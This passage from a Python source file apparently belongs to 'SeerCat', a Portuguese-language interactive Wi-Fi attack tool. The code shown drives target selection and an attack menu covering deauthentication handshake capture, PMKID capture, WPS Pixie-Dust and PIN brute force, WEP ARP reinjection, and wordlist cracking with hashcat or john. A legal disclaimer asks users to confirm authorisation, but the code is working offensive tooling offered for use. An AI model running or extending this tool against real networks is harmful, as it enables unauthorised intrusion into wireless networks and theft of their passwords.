        processos_ativos["john"] = proc

        for linha in proc.stdout:
            linha = linha.strip()
            if linha:
                log(linha, "info")

        proc.wait()
        if "john" in processos_ativos:
            del processos_ativos["john"]

        # Mostrar resultados
        resultado = subprocess.run(
            ["john", "--show", arquivo_hash],
            capture_output=True, text=True
        )
        if resultado.stdout:
            log(f"Resultado John: {resultado.stdout.strip()}", "ok")

    else:
        log("Nem hashcat nem john estão disponíveis!", "erro")


# ─────────────────────────────────────────────
#  MÓDULO 9 — GESTÃO DE SESSÃO
# ─────────────────────────────────────────────

def criar_pasta_sessao():
    """Cria estrutura de pastas para a sessão atual."""
    global pasta_sessao
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    pasta = Path.home() / "SeerCat_Sessoes" / f"sessao_{ts}"
    pasta.mkdir(parents=True, exist_ok=True)
    pasta_sessao = pasta
    log(f"Pasta de sessão criada: {pasta}", "ok")


def gerar_relatorio():
    """Gera relatório JSON da sessão."""
    if not pasta_sessao:
        return

    relatorio = {
        "sessao_inicio": sessao_inicio.isoformat(),
        "sessao_fim": datetime.datetime.now().isoformat(),
        "interface_monitor": interface_monitor,
        "redes_descobertas": redes_descobertas,
        "clientes_descobertos": clientes_descobertos,
        "log": list(log_buffer),
    }

    arquivo_rel = pasta_sessao / "relatorio.json"
    with open(arquivo_rel, "w", encoding="utf-8") as f:
        json.dump(relatorio, f, ensure_ascii=False, indent=2)

    log(f"Relatório salvo em: {arquivo_rel}", "ok")


# ─────────────────────────────────────────────
#  MENU PRINCIPAL
# ─────────────────────────────────────────────

def selecionar_interface() -> str | None:
    """Menu de seleção de interface wireless."""
    log("Detectando interfaces wireless...", "info")
    interfaces = listar_interfaces_wireless()

    if not interfaces:
        console.print(Panel(
            f"[{CORES['acento_vermelho']}]Nenhuma interface wireless detectada![/]\n"
            f"[{CORES['texto_secundario']}]Verifique se o adaptador está conectado.[/]",
            border_style=CORES['acento_vermelho'],
        ))
        return None

    tabela = Table(
        title=f"[bold {CORES['acento_ciano']}]◆ INTERFACES WIRELESS DISPONÍVEIS[/]",
        border_style=CORES['borda'],
        header_style=f"bold {CORES['acento_azul']}",
        box=box.SIMPLE_HEAD,
    )
    tabela.add_column("#", style=CORES['texto_fraco'], width=4, justify="right")
    tabela.add_column("Interface", style=f"bold {CORES['texto_primario']}")
    tabela.add_column("Status", style=CORES['acento_verde'])

    for i, iface in enumerate(interfaces, 1):
        status = "Disponível"
        if "mon" in iface:
            status = f"[{CORES['acento_rosa']}]Monitor[/]"
        tabela.add_row(str(i), iface, status)

    console.print()
    console.print(tabela)
    console.print()

    escolha = Prompt.ask(
        f"  [{CORES['acento_ciano']}]Número da interface[/]",
        default="1"
    )

    try:
        idx = int(escolha) - 1
        if 0 <= idx < len(interfaces):
            return interfaces[idx]
    except ValueError:
        pass

    return None


def menu_ataque(bssid: str):
    """Submenu de ataques para uma rede selecionada."""
    rede = redes_descobertas.get(bssid, {})
    essid = rede.get("essid", bssid).strip() or "(oculta)"
    privacidade = rede.get("privacidade", "").upper()
    canal = rede.get("canal", "1").strip()
    wps = bool(rede.get("wps", "").strip())

    console.print()
    console.print(Panel(
        f"[bold {CORES['texto_primario']}]Alvo: {essid}[/]\n"
        f"[{CORES['texto_secundario']}]BSSID: {bssid}  │  Canal: {canal}  │  Segurança: {privacidade}[/]",
        title=f"[bold {CORES['acento_rosa']}]⚡ MÓDULO DE ATAQUE[/]",
        border_style=CORES['acento_rosa'],
    ))
    console.print()

    opcoes = []
    if "WPA" in privacidade:
        opcoes.append(("1", "Capturar Handshake WPA/WPA2 (Deauth)"))
        opcoes.append(("2", "Capturar PMKID (sem clientes)"))
    if wps:
        opcoes.append(("3", "Ataque WPS Pixie-Dust (Reaver)"))
        opcoes.append(("4", "Ataque WPS PIN Bruteforce (Bully)"))
    if "WEP" in privacidade:
        opcoes.append(("5", "Ataque WEP (Reinjeção ARP)"))
    opcoes.append(("6", "Quebrar senha (Hashcat/John)"))
    opcoes.append(("0", "Voltar"))

    for num, desc in opcoes:
        cor = CORES['acento_ciano'] if num != "0" else CORES['texto_fraco']
        console.print(f"  [{cor}][{num}][/] {desc}")

    console.print()
    escolha = Prompt.ask(f"  [{CORES['acento_ciano']}]Opção[/]")

    if escolha == "1":
        arquivo = capturar_handshake(bssid, canal, interface_monitor)
        if arquivo:
            crackear = Confirm.ask(f"  [{CORES['acento_ciano']}]Tentar quebrar com wordlist agora?[/]")
            if crackear:
                wordlist = Prompt.ask(
                    f"  [{CORES['acento_ciano']}]Caminho da wordlist[/]",
                    default="/usr/share/wordlists/rockyou.txt"
                )
                quebrar_senha(arquivo, wordlist)

    elif escolha == "2":
        arquivo = capturar_pmkid(bssid, interface_monitor)
        if arquivo:
            crackear = Confirm.ask(f"  [{CORES['acento_ciano']}]Tentar quebrar com wordlist agora?[/]")
            if crackear:
                wordlist = Prompt.ask(
                    f"  [{CORES['acento_ciano']}]Caminho da wordlist[/]",
                    default="/usr/share/wordlists/rockyou.txt"
                )
                quebrar_senha(arquivo, wordlist)

    elif escolha == "3":
        atacar_wps(bssid, canal, interface_monitor, "reaver")

    elif escolha == "4":
        atacar_wps(bssid, canal, interface_monitor, "bully")

    elif escolha == "5":
        atacar_wep(bssid, canal, interface_monitor)

    elif escolha == "6":
        hashes = list(pasta_sessao.glob("*.hash")) + list(pasta_sessao.glob("*.cap"))
        if not hashes:
            log("Nenhum arquivo de hash encontrado. Capture um handshake primeiro.", "aviso")
        else:
            console.print(f"\n  Arquivos disponíveis:")
            for i, h in enumerate(hashes, 1):
                console.print(f"  [{CORES['acento_ciano']}][{i}][/] {h.name}")
            idx_h = Prompt.ask(f"  [{CORES['acento_ciano']}]Número do arquivo[/]", default="1")
            try:
                arquivo = str(hashes[int(idx_h) - 1])
            except Exception:
                arquivo = str(hashes[0])
            wordlist = Prompt.ask(
                f"  [{CORES['acento_ciano']}]Caminho da wordlist[/]",
                default="/usr/share/wordlists/rockyou.txt"
            )
            quebrar_senha(arquivo, wordlist)


def exibir_menu_principal():
    """Exibe o menu principal estilo neobank."""
    console.print(renderizar_painel_status())
    console.print()

    opcoes = [
        ("1", "⬡", "Configurar Interface Monitor", CORES['acento_ciano']),
        ("2", "◈", "Iniciar Varredura de Redes", CORES['acento_azul']),
        ("3", "◉", "Exibir Redes Descobertas", CORES['acento_roxo']),
        ("4", "⚡", "Selecionar Alvo e Atacar", CORES['acento_rosa']),
        ("5", "◆", "Log em Tempo Real", CORES['acento_verde']),
        ("6", "✦", "Gerar Relatório da Sessão", CORES['acento_amarelo']),
        ("7", "⊗", "Restaurar Interface e Sair", CORES['acento_vermelho']),
    ]

    t = Table.grid(padding=(0, 3))
    t.add_column(justify="right")
    t.add_column()

    for num, icone, desc, cor in opcoes:
        t.add_row(
            f"[bold {cor}] [{num}] {icone} [/]",
            f"[{CORES['texto_primario']}]{desc}[/]"
        )

    console.print(Panel(
        Align.center(t),
        title=f"[bold {CORES['acento_ciano']}]◆ MENU PRINCIPAL[/]",
        border_style=CORES['borda'],
        padding=(1, 4),
    ))
    console.print()

    return Prompt.ask(f"  [{CORES['acento_ciano']}]◆ Opção[/]")


# ─────────────────────────────────────────────
#  AVISO LEGAL INTERATIVO
# ─────────────────────────────────────────────

def exibir_aviso_legal() -> bool:
    """Exibe aviso legal e requer confirmação."""
    console.print()
    aviso = Text()
    aviso.append("⚠  AVISO LEGAL E ÉTICO  ⚠\n\n", style=f"bold {CORES['acento_vermelho']}")
    aviso.append(
        "Esta ferramenta foi desenvolvida EXCLUSIVAMENTE para:\n",
        style=f"bold {CORES['texto_primario']}"
    )
    aviso.append(
        "  • Testes de segurança em redes de SUA propriedade\n"
        "  • Auditorias com AUTORIZAÇÃO ESCRITA do proprietário\n"
        "  • Fins educacionais em ambientes controlados\n\n",
        style=CORES['acento_verde']
    )
    aviso.append(
        "O uso não autorizado em redes de terceiros é:\n",
        style=f"bold {CORES['acento_amarelo']}"
    )
    aviso.append(
        "  • Crime no Brasil (Lei 12.737/2012 - Lei Carolina Dieckmann)\n"
        "  • Sujeito a prisão de 3 meses a 2 anos + multa\n\n",
        style=CORES['acento_vermelho']
    )
    aviso.append(
        "O autor NÃO se responsabiliza por qualquer uso indevido.",
        style=CORES['texto_secundario']
    )

    console.print(Panel(
        aviso,
        title=f"[bold {CORES['acento_vermelho']}]TERMOS DE USO — LEIA COM ATENÇÃO[/]",
        border_style=CORES['acento_vermelho'],
        padding=(1, 3),
    ))
    console.print()

    resposta = Prompt.ask(
        f"  [{CORES['acento_amarelo']}]Você confirma que possui autorização para usar esta ferramenta? (sim/não)[/]",
        default="não"
    )

    return resposta.lower() in ["sim", "s", "yes", "y"]


# ─────────────────────────────────────────────
#  LOOP PRINCIPAL
# ─────────────────────────────────────────────

def encerrar_graciosamente(signum=None, frame=None):
    """Limpeza e encerramento gracioso."""
    console.print()
    log("Encerrando SeerCat...", "info")

    # Terminar todos os processos ativos
    for nome, proc in list(processos_ativos.items()):
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        log(f"Processo {nome} finalizado.", "debug")

    # Restaurar interface
    desativar_modo_monitor()

    # Gerar relatório
    if pasta_sessao and redes_descobertas:
        try:
            gerar_relatorio()
        except Exception:
            pass

    console.print()
    console.print(Panel(
        f"[{CORES['acento_ciano']}]SeerCat encerrado com segurança.[/]\n"
        f"[{CORES['texto_secundario']}]Sessão salva em: {pasta_sessao}[/]" if pasta_sessao else
        f"[{CORES['acento_ciano']}]SeerCat encerrado com segurança.[/]",
        title=f"[bold {CORES['acento_verde']}]✓ SESSÃO ENCERRADA[/]",
        border_style=CORES['acento_verde'],
    ))
    sys.exit(0)


def main():
    """Função principal do SeerCat."""
    global interface_monitor

    # Capturar Ctrl+C
    signal.signal(signal.SIGINT, encerrar_graciosamente)

    # Verificações iniciais
    instalar_deps_python()

    animar_banner()

    verificar_root()

    # Aviso legal
    if not exibir_aviso_legal():
        console.print(f"\n  [{CORES['acento_amarelo']}]Operação cancelada pelo usuário.[/]\n")
        sys.exit(0)

    # Criar pasta de sessão
    criar_pasta_sessao()

    # Verificar/instalar ferramentas
    console.print()
    console.print(Rule(f"[{CORES['acento_ciano']}]Verificando dependências do sistema[/]"))
    console.print()
    instalar_ferramentas_sistema()

    # Loop principal
    while True:
        console.print()
        console.print(Rule(style=CORES['borda']))
        console.print()

        try:
            opcao = exibir_menu_principal()
        except (KeyboardInterrupt, EOFError):
            encerrar_graciosamente()
            break

        if opcao == "1":
            # Configurar interface
            iface = selecionar_interface()
            if iface:
                animar_spinner("Matando processos interferentes...", 1.5, CORES['acento_amarelo'])
                matar_processos_interferentes()
                animar_spinner("Ativando modo monitor...", 2.0, CORES['acento_ciano'])
                resultado = ativar_modo_monitor(iface)
                if resultado:
                    pulsar_texto(f"✓ Modo monitor ativo: {resultado}", 3, CORES['acento_verde'])
                else:
                    log("Falha ao ativar modo monitor.", "erro")

        elif opcao == "2":
            if not interface_monitor:
                log("Configure a interface monitor primeiro (opção 1).", "aviso")
            else:
                try:
                    dur = int(Prompt.ask(
                        f"  [{CORES['acento_ciano']}]Duração da varredura (segundos)[/]",
                        default="30"
                    ))
                except ValueError:
                    dur = 30
                iniciar_varredura(interface_monitor, dur)

        elif opcao == "3":
            exibir_redes_descobertas()

        elif opcao == "4":
            if not redes_descobertas:
                log("Nenhuma rede descoberta. Execute uma varredura primeiro.", "aviso")
            elif not interface_monitor:
                log("Configure a interface monitor primeiro.", "aviso")
            else:
                exibir_redes_descobertas()
                lista_bssids = list(redes_descobertas.keys())
                try:
                    idx = int(Prompt.ask(
                        f"  [{CORES['acento_rosa']}]Número da rede alvo[/]",
                        default="1"
                    )) - 1
                    if 0 <= idx < len(lista_bssids):
                        menu_ataque(lista_bssids[idx])
                    else:
                        log("Número inválido.", "erro")
                except ValueError:
                    log("Entrada inválida.", "erro")

        elif opcao == "5":
            # Exibir log em tempo real
            console.print()
            console.print(renderizar_painel_log("LOG COMPLETO DA SESSÃO"))
            console.print()
            Prompt.ask(f"  [{CORES['texto_fraco']}]Pressione Enter para voltar[/]")

        elif opcao == "6":
            gerar_relatorio()
            if pasta_sessao:
                log(f"Arquivos da sessão: {pasta_sessao}", "ok")

        elif opcao == "7":
            encerrar_graciosamente()
            break

        else:
            log(f"Opção '{opcao}' inválida.", "aviso")


if __name__ == "__main__":
    main()
